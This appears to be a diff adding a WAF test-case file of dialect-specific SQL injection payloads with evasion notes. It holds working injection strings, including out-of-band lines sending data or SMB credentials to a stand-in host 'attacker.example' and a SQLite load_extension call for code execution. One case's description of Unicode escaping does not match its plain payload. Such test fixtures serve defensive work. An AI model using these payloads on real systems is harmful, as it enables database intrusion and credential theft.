@@ -1,0 +1,133 @@
+schema = 1
+# SQL injection — dialect-specific syntax that WAFs trained on
+# MySQL miss against Postgres / SQLite / MSSQL / Oracle. Each
+# dialect has its own comment / quote / escape conventions that
+# bypass naive rules.
+
+# ── PostgreSQL dollar-quoted strings ──
+
+[[case]]
+id = "pg_dollar_quote_tautology"
+class = "sql"
+payload = "$tag$'OR 1=1--$tag$"
+description = "Postgres $tag$ dollar-quoted string — content is opaque  to WAFs that pattern-match single-quote escapes"
+
+[[case]]
+id = "pg_dollar_quote_arbitrary_tag"
+class = "sql"
+payload = "$x$ union select 1,2,3 $x$"
+description = "Same idea with a 1-char tag — even harder to pattern-match"
+
+[[case]]
+id = "pg_format_string_function"
+class = "sql"
+payload = "'||format('OR 1=%s','1')||'"
+description = "Postgres format() function for string composition —  bypasses literal `OR 1=1` matchers"
+
+# ── PostgreSQL E'' escape strings ──
+
+[[case]]
+id = "pg_e_escape_string"
+class = "sql"
+payload = "E'\\047 OR 1=1--'"
+description = "Postgres E'' escape syntax — \\047 is the octal for `'`;  WAFs that scan for literal apostrophes miss"
+
+[[case]]
+id = "pg_e_escape_concat"
+class = "sql"
+payload = "' || E'\\047 OR 1=1 --' || '"
+description = "Concat-style attack with escape-string segments"
+
+# ── MSSQL square-bracket identifiers ──
+
+[[case]]
+id = "mssql_bracket_identifier"
+class = "sql"
+payload = "1; SELECT [name] FROM [sys].[databases]--"
+description = "MSSQL bracket-quoted identifiers — bypasses backtick /  double-quote anchored WAF rules"
+
+[[case]]
+id = "mssql_unicode_string_prefix"
+class = "sql"
+payload = "N'1' OR N'1'=N'1'"
+description = "MSSQL N'...' Unicode-string-literal prefix — same semantic  as a plain string but defeats literal-quote rules"
+
+[[case]]
+id = "mssql_waitfor_delay_blind"
+class = "sql"
+payload = "'; WAITFOR DELAY '0:0:5'--"
+description = "MSSQL WAITFOR DELAY — time-based blind probe; many WAFs  only match `SLEEP(` (MySQL) and miss the MSSQL form"
+
+[[case]]
+id = "mssql_xp_dirtree_smb_oob"
+class = "sql"
+payload = "'; EXEC xp_dirtree '\\\\attacker.example\\share'--"
+description = "MSSQL xp_dirtree on UNC path — OOB SMB connection to  attacker; common credential-theft technique"
+
+# ── SQLite ATTACH ──
+
+[[case]]
+id = "sqlite_attach_arbitrary_path"
+class = "sql"
+payload = "'; ATTACH DATABASE '/tmp/x.sqlite' AS x--"
+description = "SQLite ATTACH — attaches an attacker-controlled DB file;  breaks isolation when sqlite is the backend"
+
+[[case]]
+id = "sqlite_load_extension"
+class = "sql"
+payload = "'; SELECT load_extension('/tmp/evil.so')--"
+description = "SQLite load_extension — RCE via shared object loading"
+
+# ── Oracle dual-table quirks ──
+
+[[case]]
+id = "oracle_dual_subquery"
+class = "sql"
+payload = "' OR (SELECT 1 FROM dual)=1--"
+description = "Oracle DUAL table — pseudo-system table for single-row  queries; required in Oracle but defeats MySQL-pinned rules"
+
+[[case]]
+id = "oracle_utl_http_oob"
+class = "sql"
+payload = "'||UTL_HTTP.REQUEST('http://attacker.example/'||(SELECT password FROM users WHERE ROWNUM=1))||'"
+description = "Oracle UTL_HTTP — OOB HTTP fetch leaking query results"
+
+[[case]]
+id = "oracle_concat_with_chr"
+class = "sql"
+payload = "'||CHR(79)||CHR(82)||' 1=1--"
+description = "Oracle CHR() concat — assembles OR keyword char-by-char"
+
+# ── MySQL hex / binary literals ──
+
+[[case]]
+id = "mysql_hex_literal_union"
+class = "sql"
+payload = "' UNION SELECT 0x756e696f6e--"
+description = "MySQL hex literal — 0x756e696f6e = `union` as bytes;  bypasses keyword scanners"
+
+[[case]]
+id = "mysql_binary_keyword"
+class = "sql"
+payload = "' UNION SELECT BINARY 'admin'--"
+description = "MySQL BINARY keyword — coerces a string to binary;  changes string-comparison semantics, can bypass case-fold"
+
+[[case]]
+id = "mysql_natural_join_no_predicate"
+class = "sql"
+payload = "1 NATURAL JOIN information_schema.tables"
+description = "NATURAL JOIN — implicit join condition; defeats rules  pattern-matching explicit ON clauses"
+
+# ── Generic Unicode + escape variants ──
+
+[[case]]
+id = "unicode_or_keyword"
+class = "sql"
+payload = "1' OR 1=1--"
+description = "Single-quote and OR keyword Unicode-escaped — bypasses  literal-byte WAF; SQL parser folds back"
+
+[[case]]
+id = "ms_smart_quote_tautology"
+class = "sql"
+payload = "'’ OR 1=1—"
+description = "Smart quote (U+2019) instead of apostrophe + em-dash  (U+2014) instead of double-hyphen comment; some clients  normalise typographic quotes before sending to DB"
